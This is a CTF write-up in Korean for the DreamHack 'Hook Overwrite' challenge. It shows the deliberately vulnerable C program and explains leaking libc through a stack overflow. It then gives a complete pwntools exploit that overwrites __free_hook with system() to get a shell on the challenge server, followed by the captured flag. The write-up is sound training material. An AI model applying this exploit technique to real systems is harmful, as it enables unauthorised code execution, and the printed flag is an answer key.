# [DreamHack] Hook Overwrite

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> Exploit Tech: Hook Overwrite에서 실습하는 문제입니다.
>
> Release: [fho.zip](https://github.com/h0meb0dy/Dreamhack-Wargame/files/8548585/fho.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/102066383/160252918-e968dfa5-283f-42bc-a851-6eefb7a62351.png)

## Analysis

```c
int main() {
  char buf[0x30];
  unsigned long long *addr;
  unsigned long long value;

  setvbuf(stdin, 0, _IONBF, 0);
  setvbuf(stdout, 0, _IONBF, 0);

  puts("[1] Stack buffer overflow");
  printf("Buf: ");
  read(0, buf, 0x100);
  printf("Buf: %s\n", buf);

  puts("[2] Arbitary-Address-Write");
  printf("To write: ");
  scanf("%llu", &addr);
  printf("With: ");
  scanf("%llu", &value);
  printf("[%p] = %llu\n", addr, value);
  *addr = value;

  puts("[3] Arbitrary-Address-Free");
  printf("To free: ");
  scanf("%llu", &addr);
  free(addr);

  return 0;
}
```

`[1] Stack buffer overflow`에서 발생하는 BOF를 이용하여 `main()`의 return address를 leak하면 libc 주소를 구할 수 있다.

`[2] Arbitary-Address-Write`에서 원하는 주소에 원하는 8바이트 값을 쓸 수 있고, `[3] Arbitrary-Address-Free`에서 원하는 주소를 인자로 `free()`를 호출할 수 있다. free hook을 `system()`의 주소로 덮고, `"/bin/sh"` 문자열의 주소를 인자로 `free()`를 호출하면 셸을 획득할 수 있다.

## Exploit

```python
from pwn import *

REMOTE = True

if REMOTE:
    r = remote('host1.dreamhack.games', 8949)
    libcstartmain_offset = 0x21b10
    system_offset = 0x4f550
    binsh_offset = 0x1b3e1a
    freehook_offset = 0x3ed8e8
else:
    r = process('./release/fho')
    libcstartmain_offset = 0x21ba0
    system_offset = 0x4f420
    binsh_offset = 0x1b3d88
    freehook_offset = 0x3ed8e8


# leak libc

r.sendafter('Buf: ', 'a' * 0x48)
r.recvuntil('Buf: ' + 'a' * 0x48)
libcstartmain = u64(r.recvn(6).ljust(8, b'\x00')) - 231  # __libc_start_main()
libc = libcstartmain - libcstartmain_offset
system = libc + system_offset  # system()
binsh = libc + binsh_offset  # "/bin/sh"
freehook = libc + freehook_offset  # __free_hook


# overwrite free hook with system()

r.sendlineafter('To write: ', str(freehook))
r.sendlineafter('With: ', str(system))


# call free("/bin/sh")

r.sendlineafter('To free: ', str(binsh))


r.interactive()
```

```
$ python3 solve.py
[+] Opening connection to host1.dreamhack.games on port 8949: Done
[*] Switching to interactive mode
$ cat flag
DH{584ea800b3d6ff90857aa4300ba42218}
```